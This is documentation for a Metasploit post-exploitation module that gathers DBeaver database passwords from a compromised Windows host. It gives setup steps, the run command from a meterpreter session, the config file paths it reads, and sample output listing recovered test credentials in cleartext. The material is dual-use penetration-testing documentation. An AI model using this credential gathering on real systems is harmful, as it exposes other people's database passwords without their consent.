## Vulnerable Application

  Any Windows host with a `meterpreter` session and Dbeaver full version
  installed. The following passwords will be searched for and recovered:

### Installation Steps

  1. Download the latest installer of Dbeaver (https://dbeaver.io/files/6.1.0/) and latest version.
  2. Select default installation
  3. Open the software and create a database connection
     complete password setting, add the test account password to the certificate.

## Verification Steps

  1. Get a `meterpreter` session on a Windows host.
  2. Do: `run post/windows/gather/credentials/dbeaver`
  3. If the system has registry keys for Dbeaver passwords they will be printed out.

## Options

 **XML_FILE_PATH**

- Specify an XML configuration file.
- eg. `C:\Users\FireEye\.dbeaver4\General\.dbeaver-data-sources.xml` or 
      `C:\Users\FireEye\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver-data-sources.xml`

 **JSON_DIR_PATH**

- Specifies the config dir path for Dbeaver.
- Ensure that there are two files `credentials-config.json` and `data-sources.json` under the directory
- eg. `"C:\Users\FireEye\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver`

## Scenarios

```
meterpreter > run post/windows/gather/credentials/dbeaver

[*] Gather Dbeaver Passwords on FireEye
[+] dbeaver .dbeaver-data-sources.xml saved to /home/kali-team/.msf4/loot/20221205145256_default_172.16.153.128_dbeaver.creds_319751.txt
[*] Finished processing C:\Users\FireEye\.dbeaver4\General\.dbeaver-data-sources.xml
[+] dbeaver credentials-config.json saved to /home/kali-team/.msf4/loot/20221205145256_default_172.16.153.128_dbeaver.creds_334807.txt
[+] dbeaver data-sources.json saved to /home/kali-team/.msf4/loot/20221205145256_default_172.16.153.128_dbeaver.creds_309767.txt
[*] Finished processing C:\Users\FireEye\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver
[+] Passwords stored in: /home/kali-team/.msf4/loot/20221205145256_default_172.16.153.128_host.dbeaver_421133.txt
[+] Dbeaver Password
================

Name             Protocol    Hostname   Port  Username  Password        DB        URI                                        Type
----             --------    --------   ----  --------  --------        --        ---                                        ----
Test_MYSQL       mysql       localhost  3306  root      test_password   db        jdbc:mysql://localhost:3306/db             dev
Test_PostgreSQL  postgresql  localhost  5432  postgres  test_passwordr  postgres  jdbc:postgresql://localhost:5432/postgres  dev
localhost        mysql       localhost  3306  root      test_mysql      db        jdbc:mysql://localhost:3306/db             test
postgres         postgresql  localhost  5432  postgres  test_postgres   postgres  jdbc:postgresql://localhost:5432/postgres  prod

meterpreter > 
```
